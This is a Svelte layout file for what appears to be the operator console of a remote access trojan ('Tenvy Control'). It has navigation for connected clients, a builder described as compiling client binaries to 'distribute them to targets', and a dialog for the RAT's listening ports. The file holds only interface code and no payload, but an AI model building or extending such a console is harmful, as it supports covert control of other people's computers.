<script lang="ts">
	import { cn } from '$lib/utils.js';
	import {
		Sidebar,
		SidebarContent,
		SidebarFooter,
		SidebarHeader,
		SidebarInset,
		SidebarMenu,
		SidebarMenuBadge,
		SidebarMenuButton,
		SidebarMenuItem,
		SidebarProvider,
		SidebarRail,
		SidebarTrigger
	} from '$lib/components/ui/sidebar/index.js';
	import { Avatar, AvatarFallback } from '$lib/components/ui/avatar/index.js';
	import { Badge } from '$lib/components/ui/badge/index.js';
	import { Button } from '$lib/components/ui/button/index.js';
	import { Input } from '$lib/components/ui/input/index.js';
	import {
		Breadcrumb,
		BreadcrumbItem,
		BreadcrumbLink,
		BreadcrumbList,
		BreadcrumbPage,
		BreadcrumbSeparator
	} from '$lib/components/ui/breadcrumb/index.js';
	import { Label } from '$lib/components/ui/label/index.js';
	import { Popover, PopoverContent, PopoverTrigger } from '$lib/components/ui/popover/index.js';
	import { Separator } from '$lib/components/ui/separator/index.js';
	import { Checkbox } from '$lib/components/ui/checkbox/index.js';
	import * as Dialog from '$lib/components/ui/dialog/index.js';
	import { Toaster } from '$lib/components/ui/sonner/index.js';
	import type { IconComponent, NavKey } from '$lib/types/navigation.js';
	import type { AuthenticatedUser } from '$lib/server/auth';
	import {
		clearStoredPorts,
		formatPortSummary,
		loadStoredPorts,
		parsePortInput,
		persistPortSelection
	} from '$lib/utils/rat-port-preferences.js';
	import { browser } from '$app/environment';
	import { goto } from '$app/navigation';
	import { resolve } from '$app/paths';
	import {
		Activity,
		Bell,
		LogOut,
		LayoutDashboard,
		Hammer,
		Plug,
		PlugZap,
		Search,
		Settings,
		User,
		Users,
		Sun,
		Moon
	} from '@lucide/svelte';
	import { onMount } from 'svelte';
	import type { ComponentProps } from 'svelte';
	import { toggleMode } from 'mode-watcher';

	type NavHref = '/dashboard' | '/clients' | '/build' | '/activity' | '/plugins';

	type NavItem = {
		title: string;
		icon: IconComponent;
		badgeClass?: string;
		slug: NavKey;
		href: NavHref;
	};

	type SidebarMenuButtonChildContext = Parameters<
		NonNullable<ComponentProps<typeof SidebarMenuButton>['child']>
	>[0];

	const navItems: NavItem[] = [
		{
			title: 'Dashboard',
			icon: LayoutDashboard,
			badgeClass: 'bg-emerald-500/20 text-emerald-500',
			slug: 'dashboard',
			href: '/dashboard'
		},
		{
			title: 'Clients',
			icon: Users,
			badgeClass: 'bg-blue-500/15 text-blue-500',
			slug: 'clients',
			href: '/clients'
		},
		{
			title: 'Build',
			icon: Hammer,
			slug: 'build',
			href: '/build'
		},
		{
			title: 'Activity',
			icon: Activity,
			badgeClass: 'bg-sidebar-primary/10 text-sidebar-primary',
			slug: 'activity',
			href: '/activity'
		},
		{
			title: 'Plugins',
			icon: PlugZap,
			badgeClass: 'bg-purple-500/15 text-purple-500',
			slug: 'plugins',
			href: '/plugins'
		}
	];

	const navSummaries: Record<NavKey, { title: string; description: string }> = {
		dashboard: {
			title: 'Dashboard',
			description: 'Monitor connected agents, watch map & logs, and more.'
		},
		clients: {
			title: 'Clients',
			description:
				'Inspect connected endpoints, filter by posture, and triage which agents need attention next.'
		},
		build: {
			title: 'Builder',
			description: 'Compile customized client binaries and distribute them to targets.'
		},
		activity: {
			title: 'Activity',
			description: 'Streaming event timelines and operation history.'
		},
		plugins: {
			title: 'Plugins',
			description: 'Manage extensions and modular capabilities for the platform.'
		},
		settings: {
			title: 'Settings',
			description: 'Global preferences and administrative configuration.'
		}
	};

	const PORT_SYNC_CHANNEL_NAME = 'tenvy.rat-port-sync';
	const PORT_SYNC_STORAGE_KEY = 'tenvy.rat-port-sync-message';

	type PortSyncPayload =
		| { type: 'state-request'; source: string }
		| { type: 'state-update'; source: string; ports: number[]; remember: boolean }
		| { type: 'state-clear'; source: string };

	type PortSyncMessage =
		| { type: 'state-request' }
		| { type: 'state-update'; ports: number[]; remember: boolean }
		| { type: 'state-clear' };

	let portSyncChannel: BroadcastChannel | null = null;
	let portSyncId: string | null = null;

	function generatePortSyncId(): string {
		if (typeof crypto !== 'undefined' && typeof crypto.randomUUID === 'function') {
			return crypto.randomUUID();
		}

		return Math.random().toString(36).slice(2);
	}

	function postPortSync(message: PortSyncMessage) {
		if (!browser || !portSyncId) {
			return;
		}

		const payload: PortSyncPayload = { ...message, source: portSyncId };

		if (portSyncChannel) {
			portSyncChannel.postMessage(payload);
			return;
		}

		try {
			window.localStorage.setItem(PORT_SYNC_STORAGE_KEY, JSON.stringify(payload));
			window.localStorage.removeItem(PORT_SYNC_STORAGE_KEY);
		} catch {
			// ignore silently
		}
	}

	const searchPlaceholders: Partial<Record<NavKey, string>> = {
		clients: 'Search clients, hosts, IPs...'
	};

	const defaultSearchPlaceholder = 'Search clients, plugins, activity...';

	let selectedPorts = $state<number[]>([]);
	let rememberPorts = $state(false);
	let portDialogOpen = $state(false);
	let portInputValue = $state('');
	let portDialogRemember = $state(false);
	let portDialogError = $state<string | null>(null);
	let hasHydrated = $state(false);

	const portSummary = $derived(() => formatPortSummary(selectedPorts));

	function openPortDialog() {
		portInputValue = portSummary();
		portDialogRemember = rememberPorts;
		portDialogError = null;
		portDialogOpen = true;
	}

	function handlePortSubmit() {
		const trimmed = portInputValue.trim();
		const result = parsePortInput(trimmed);

		if (!result.ok) {
			portDialogError = result.error;
			return;
		}

		selectedPorts = result.ports;
		rememberPorts = portDialogRemember;
		portInputValue = formatPortSummary(result.ports);
		portDialogError = null;
		portDialogOpen = false;

		persistPortSelection(result.ports, portDialogRemember);
		postPortSync({
			type: 'state-update',
			ports: result.ports,
			remember: portDialogRemember
		});
	}

	function handleClearPortPreferences() {
		clearStoredPorts();
		selectedPorts = [];
		rememberPorts = false;
		portDialogRemember = false;
		portInputValue = '';
		portDialogError = null;
		portDialogOpen = true;
		postPortSync({ type: 'state-clear' });
	}

	onMount(() => {
		if (!browser) {
			return;
		}

		const stored = loadStoredPorts();

		if (stored) {
			selectedPorts = stored.ports;
			rememberPorts = stored.remember;
			portInputValue = formatPortSummary(stored.ports);
			portDialogRemember = stored.remember;
		} else {
			openPortDialog();
		}

		hasHydrated = true;

		portSyncId = generatePortSyncId();

		const handleIncoming = (payload: PortSyncPayload | null | undefined) => {
			if (!payload || payload.source === portSyncId) {
				return;
			}

			if (payload.type === 'state-request') {
				if (selectedPorts.length > 0) {
					postPortSync({
						type: 'state-update',
						ports: selectedPorts,
						remember: rememberPorts
					});
				} else {
					postPortSync({ type: 'state-clear' });
				}
				return;
			}

			if (payload.type === 'state-update') {
				selectedPorts = payload.ports;
				rememberPorts = payload.remember;
				portDialogRemember = payload.remember;
				portInputValue = formatPortSummary(payload.ports);
				portDialogError = null;

				if (payload.ports.length > 0) {
					portDialogOpen = false;
				}

				persistPortSelection(payload.ports, payload.remember);
				return;
			}

			if (payload.type === 'state-clear') {
				selectedPorts = [];
				rememberPorts = false;
				portDialogRemember = false;
				portInputValue = '';
				portDialogError = null;

				if (!portDialogOpen) {
					portDialogOpen = true;
				}

				persistPortSelection([], false);
			}
		};

		const storageListener = (event: StorageEvent) => {
			if (event.key !== PORT_SYNC_STORAGE_KEY || !event.newValue) {
				return;
			}

			try {
				const payload = JSON.parse(event.newValue) as PortSyncPayload;
				handleIncoming(payload);
			} catch {
				// Ignore malformed sync messages.
			}
		};

		window.addEventListener('storage', storageListener);

		let channel: BroadcastChannel | null = null;
		let channelListener: ((event: MessageEvent<PortSyncPayload>) => void) | null = null;

		if ('BroadcastChannel' in window) {
			channel = new BroadcastChannel(PORT_SYNC_CHANNEL_NAME);
			channelListener = (event) => handleIncoming(event.data);
			channel.addEventListener('message', channelListener);
			portSyncChannel = channel;
		} else {
			portSyncChannel = null;
		}

		queueMicrotask(() => {
			postPortSync({ type: 'state-request' });
		});

		return () => {
			window.removeEventListener('storage', storageListener);

			if (channel && channelListener) {
				channel.removeEventListener('message', channelListener);
				channel.close();
			}

			if (portSyncChannel === channel) {
				portSyncChannel = null;
			}

			portSyncId = null;
		};
	});

	$effect(() => {
		if (hasHydrated && !portDialogOpen && selectedPorts.length === 0) {
			portDialogOpen = true;
		}
	});

	type NavigationBadgeMap = Partial<Record<NavKey, string>>;

	type LayoutData = {
		activeNav: NavKey;
		user: AuthenticatedUser;
		navBadges?: NavigationBadgeMap;
	};

	let { children, data: layoutData } = $props<{ data: LayoutData }>();

	const activeSummary = $derived(() => {
		const { activeNav } = layoutData as LayoutData;
		return navSummaries[activeNav];
	});

	const globalSearchPlaceholder = $derived(() => {
		const { activeNav } = layoutData as LayoutData;
		return searchPlaceholders[activeNav] ?? defaultSearchPlaceholder;
	});

	function formatIdentifier(value: string) {
		const cleaned = value.replace(/[^a-z0-9]/gi, '');
		const slice = cleaned.slice(0, 2);
		return slice ? slice.toUpperCase() : 'OP';
	}

	const operatorInitials = $derived(() =>
		formatIdentifier((layoutData as LayoutData)?.user?.id ?? '')
	);

	const operatorLabel = $derived(() => {
		const id = (layoutData as LayoutData)?.user?.id ?? '';
		return id ? `XeinTDM ${id.slice(0, 6).toUpperCase()}` : 'XeinTDM';
	});

	const voucherDescriptor = $derived(() => {
		const user = (layoutData as LayoutData)?.user;
		if (!user?.voucherId) {
			return 'Unavailable';
		}
		const truncated =
			user.voucherId.length > 10 ? `${user.voucherId.slice(0, 10)}…` : user.voucherId;
		return `${truncated} · ${user.voucherActive ? 'Voucher active' : 'Voucher inactive'}`;
	});

	const voucherStatusBadgeVariant = $derived(() => {
		const active = (layoutData as LayoutData)?.user?.voucherActive;
		if (active === false) {
			return 'destructive';
		}
		return 'outline';
	});

	const navBadgeMap = $derived(
		() => (layoutData as LayoutData)?.navBadges ?? ({} as NavigationBadgeMap)
	);
	const getNavBadge = (slug: NavKey) => navBadgeMap()[slug];

	const voucherStatusLabel = $derived(() => {
		const active = (layoutData as LayoutData)?.user?.voucherActive;
		if (active === true) {
			return 'Voucher active';
		}
		if (active === false) {
			return 'Voucher inactive';
		}
		return 'Unavailable';
	});

	function navigateToSettings(event?: Event) {
		event?.preventDefault();
		void goto(resolve('/settings'));
	}
</script>

<SidebarProvider>
	<Sidebar collapsible="icon">
		<SidebarHeader class="border-b border-sidebar-border px-2 pt-3 pb-4">
			<div
				class="flex items-center gap-3 rounded-lg px-2 py-1.5 group-data-[state=collapsed]:justify-center"
			>
				<div
					class="flex h-14 w-14 items-center justify-center group-data-[state=collapsed]:h-9 group-data-[state=collapsed]:w-9"
				>
					<img
						src="/LAHS.png"
						alt="Tenvy Logo"
						title="Tenvy Control · Made By Rootbay"
						class="max-h-full max-w-full rounded-full"
					/>
				</div>
				<div class="grid gap-px group-data-[state=collapsed]:hidden">
					<span class="text-sm leading-tight font-semibold">Tenvy Control</span>
					<span class="text-xs leading-tight text-sidebar-foreground/70">Made By Rootbay</span>
				</div>
			</div>
		</SidebarHeader>
		<SidebarContent>
			<SidebarMenu class="px-2 pt-2">
				{#each navItems as item (item.slug)}
					{#snippet NavLink({ props }: SidebarMenuButtonChildContext)}
						{@const { class: existingClass } = props as { class?: string }}
						{@const className = cn('cursor-pointer', existingClass)}
						<a
							{...props}
							class={className}
							href={resolve(item.href)}
							data-sveltekit-preload-data="hover"
							aria-current={item.slug === layoutData.activeNav ? 'page' : undefined}
						>
							<item.icon />
							<div class="flex min-w-0 flex-col gap-0.5 text-left">
								<span class="truncate text-sm font-medium">{item.title}</span>
							</div>
						</a>
					{/snippet}
					<SidebarMenuItem class="cursor-pointer">
						<SidebarMenuButton
							isActive={item.slug === layoutData.activeNav}
							tooltipContent={item.title}
							child={NavLink}
						/>
						{@const badgeText = getNavBadge(item.slug)}
						{#if badgeText}
							<SidebarMenuBadge
								class={cn('mr-2 bg-sidebar-accent text-sidebar-accent-foreground', item.badgeClass)}
							>
								{badgeText}
							</SidebarMenuBadge>
						{/if}
					</SidebarMenuItem>
				{/each}
			</SidebarMenu>
		</SidebarContent>
		<SidebarFooter
			class="mt-auto border-t border-sidebar-border px-2 py-4 group-data-[state=collapsed]:border-t-0"
		>
			<div
				class={cn(
					'grid w-full grid-cols-[minmax(0,1fr)_auto] items-center gap-2',
					'group-data-[state=collapsed]:grid-cols-1 group-data-[state=collapsed]:items-stretch group-data-[state=collapsed]:gap-3'
				)}
			>
				<Button
					type="button"
					variant="ghost"
					size="icon"
					class="hidden shrink-0 text-sidebar-foreground/70 group-data-[state=collapsed]:inline-flex hover:text-sidebar-accent-foreground"
					onclick={navigateToSettings}
				>
					<Settings class="h-4 w-4" />
					<span class="sr-only">Open settings</span>
				</Button>
				<Separator
					orientation="horizontal"
					class="hidden h-px w-full border-sidebar-border/60 group-data-[state=collapsed]:block"
				/>
				<div class="min-w-0 group-data-[state=collapsed]:w-full">
					<Popover>
						<PopoverTrigger
							type="button"
							class={cn(
								'flex w-full min-w-0 items-center gap-3 rounded-md bg-sidebar-accent/60 px-3 py-2 text-left transition hover:bg-sidebar-accent hover:text-sidebar-accent-foreground focus-visible:ring-2 focus-visible:ring-sidebar-ring focus-visible:outline-none',
								'group-data-[state=collapsed]:justify-center group-data-[state=collapsed]:gap-2 group-data-[state=collapsed]:px-2 group-data-[state=collapsed]:py-3 group-data-[state=collapsed]:text-center',
								'group-data-[state=collapsed]:bg-transparent group-data-[state=collapsed]:shadow-none group-data-[state=collapsed]:hover:bg-transparent group-data-[state=collapsed]:focus-visible:ring-0'
							)}
						>
							<Avatar class="h-9 w-9">
								<AvatarFallback>{operatorInitials()}</AvatarFallback>
							</Avatar>
							<div class="min-w-0 flex-1 group-data-[state=collapsed]:hidden">
								<p class="truncate text-sm leading-tight font-medium">{operatorLabel()}</p>
								<p class="truncate text-xs leading-tight text-sidebar-foreground/70">
									{voucherDescriptor()}
								</p>
							</div>
							<div
								class="flex items-center justify-end text-sidebar-foreground/70 group-data-[state=collapsed]:hidden"
							>
								<User class="h-4 w-4" />
							</div>
							<span class="sr-only">Open operator menu</span>
						</PopoverTrigger>
						<PopoverContent align="end" sideOffset={12} class="w-64 space-y-4 p-4">
							<div class="flex items-start justify-between gap-3">
								<div class="flex items-center gap-3">
									<Avatar class="h-10 w-10">
										<AvatarFallback>{operatorInitials()}</AvatarFallback>
									</Avatar>
									<div class="min-w-0">
										<p class="truncate text-sm leading-tight font-medium">{operatorLabel()}</p>
										<p class="truncate text-xs leading-tight text-muted-foreground">
											{voucherDescriptor()}
										</p>
									</div>
								</div>
								<Badge
									variant={voucherStatusBadgeVariant()}
									class="shrink-0 text-[10px] tracking-wide uppercase"
								>
									{voucherStatusLabel()}
								</Badge>
							</div>
							<Separator />
							<div class="grid gap-2">
								<Button type="button" variant="ghost" size="sm" class="justify-start gap-2">
									<User class="h-4 w-4" />
									View profile
								</Button>
								<Button
									type="button"
									variant="ghost"
									size="sm"
									class="justify-start gap-2"
									onclick={navigateToSettings}
								>
									<Settings class="h-4 w-4" />
									Console preferences
								</Button>
								<Button onclick={toggleMode} variant="ghost" size="sm" class="justify-start gap-2">
									<Sun
										class="h-[1.2rem] w-[1.2rem] scale-100 rotate-0 transition-all! dark:scale-0 dark:-rotate-90"
									/>
									<Moon
										class="absolute h-[1.2rem] w-[1.2rem] scale-0 rotate-90 transition-all! dark:scale-100 dark:rotate-0"
									/>
									Toggle theme
								</Button>
								<Button
									type="button"
									variant="ghost"
									size="sm"
									class="justify-start gap-2 text-destructive hover:bg-destructive/10 hover:text-destructive"
								>
									<LogOut class="h-4 w-4" />
									Sign out
								</Button>
							</div>
						</PopoverContent>
					</Popover>
				</div>
				<Button
					type="button"
					variant="ghost"
					size="icon"
					class={cn(
						'shrink-0 text-sidebar-foreground/70 hover:text-sidebar-accent-foreground',
						'group-data-[state=collapsed]:hidden'
					)}
					onclick={navigateToSettings}
				>
					<Settings class="h-4 w-4" />
					<span class="sr-only">Open settings</span>
				</Button>
			</div>
		</SidebarFooter>
		<SidebarRail />
	</Sidebar>
	<SidebarInset>
		<header class="flex h-16 shrink-0 items-center gap-3 border-b">
			<SidebarTrigger class="md:hidden" />
			<Separator orientation="vertical" class="h-6" />
			<div class="flex flex-1 items-center gap-3">
				<div class="relative w-full max-w-md">
					<Search
						class="pointer-events-none absolute top-1/2 left-3 h-4 w-4 -translate-y-1/2 text-muted-foreground"
					/>
					<Input type="search" placeholder={globalSearchPlaceholder()} class="pl-10" />
				</div>
				<Button
					type="button"
					variant="outline"
					class={cn(
						'hidden max-w-xs items-center gap-2 truncate whitespace-nowrap sm:inline-flex',
						selectedPorts.length === 0 &&
							'border-dashed border-destructive/60 text-destructive hover:text-destructive'
					)}
					title={selectedPorts.length > 0
						? `RAT listening ports: ${portSummary()}`
						: 'Select RAT listening ports'}
					onclick={() => openPortDialog()}
				>
					<Plug class="h-4 w-4 shrink-0" />
					{#if selectedPorts.length > 0}
						<span class="text-xs tracking-wide text-muted-foreground uppercase">Ports</span>
						<span class="truncate text-sm font-medium">{portSummary()}</span>
						{#if rememberPorts}
							<Badge
								variant="outline"
								class="hidden text-[10px] tracking-wide text-muted-foreground uppercase xl:inline-flex"
							>
								Remembered
							</Badge>
						{/if}
					{:else}
						<span class="text-sm font-medium">Select RAT ports</span>
					{/if}
				</Button>
				<Button
					type="button"
					variant="outline"
					size="icon"
					class={cn(
						'sm:hidden',
						selectedPorts.length === 0 &&
							'border-dashed border-destructive/60 text-destructive hover:text-destructive'
					)}
					title={selectedPorts.length > 0
						? `RAT listening ports: ${portSummary()}`
						: 'Select RAT listening ports'}
					onclick={() => openPortDialog()}
				>
					<Plug class="h-4 w-4" />
					<span class="sr-only">
						{selectedPorts.length > 0
							? `Update RAT listening ports (${portSummary()}${rememberPorts ? ', remembered preference' : ''})`
							: 'Configure RAT listening ports'}
					</span>
				</Button>
				<Button variant="ghost" size="icon">
					<Bell class="h-4 w-4" />
					<span class="sr-only">Notifications</span>
				</Button>
			</div>
		</header>
		<div class="flex flex-1 flex-col overflow-hidden">
			<div class="flex flex-1 flex-col gap-8 overflow-hidden p-6">
				{#key (layoutData as LayoutData).activeNav}
					{@const summary = activeSummary()}
					<section class="flex flex-wrap items-center justify-between gap-4">
						<div class="space-y-2">
							<Breadcrumb>
								<BreadcrumbList>
									<BreadcrumbItem>
										<BreadcrumbLink href="/dashboard">Console</BreadcrumbLink>
									</BreadcrumbItem>
									<BreadcrumbSeparator />
									<BreadcrumbItem>
										<BreadcrumbPage>
											{summary.title}
										</BreadcrumbPage>
									</BreadcrumbItem>
								</BreadcrumbList>
							</Breadcrumb>
							<div>
								<h1 class="text-2xl font-semibold tracking-tight">
									{summary.title}
								</h1>
								<p class="text-sm text-muted-foreground">
									{summary.description}
								</p>
							</div>
						</div>
					</section>
					<div class="flex min-h-0 flex-1 flex-col gap-8">
						{@render children?.()}
					</div>
				{/key}
			</div>
		</div>
	</SidebarInset>
	<Dialog.Root bind:open={portDialogOpen}>
		<Dialog.Content class="sm:max-w-lg">
			<Dialog.Header>
				<Dialog.Title>Configure RAT listening ports</Dialog.Title>
				<Dialog.Description>
					Choose the ports the remote access tooling should listen on once you are signed in.
				</Dialog.Description>
			</Dialog.Header>
			<form class="space-y-6" onsubmit={handlePortSubmit}>
				<div class="space-y-2">
					<Label for="rat-port-input">Listening ports</Label>
					<Input
						id="rat-port-input"
						placeholder="4444, 8080"
						bind:value={portInputValue}
						inputmode="numeric"
						autocomplete="off"
						spellcheck={false}
						aria-invalid={Boolean(portDialogError)}
						aria-describedby={`rat-port-input-hint${portDialogError ? ' rat-port-input-error' : ''}`}
					/>
					<p id="rat-port-input-hint" class="text-xs text-muted-foreground">
						Separate multiple ports with commas or spaces. Valid range: 1 to 65,535.
					</p>
				</div>
				<div class="flex items-start gap-3">
					<Checkbox
						id="remember-rat-ports"
						bind:checked={portDialogRemember}
						aria-describedby="remember-rat-ports-hint"
					/>
					<div class="grid gap-1">
						<Label for="remember-rat-ports" class="leading-none">Remember selected ports</Label>
						<p id="remember-rat-ports-hint" class="text-xs text-muted-foreground">
							Store this preference locally and reuse it for future sessions.
						</p>
					</div>
				</div>
				{#if portDialogError}
					<p id="rat-port-input-error" class="text-sm text-destructive">{portDialogError}</p>
				{/if}
				{#if selectedPorts.length > 0}
					<Button
						type="button"
						variant="ghost"
						class="justify-start text-destructive hover:text-destructive focus-visible:ring-destructive/20"
						onclick={handleClearPortPreferences}
					>
						Clear saved ports
					</Button>
				{/if}
				<Dialog.Footer>
					<Button type="submit">Save ports</Button>
					{#if selectedPorts.length > 0}
						<Dialog.Close>
							{#snippet child({ props })}
								<Button {...props} type="button" variant="outline">Cancel</Button>
							{/snippet}
						</Dialog.Close>
					{/if}
				</Dialog.Footer>
			</form>
		</Dialog.Content>
	</Dialog.Root>
</SidebarProvider>
<Toaster position="bottom-right" />
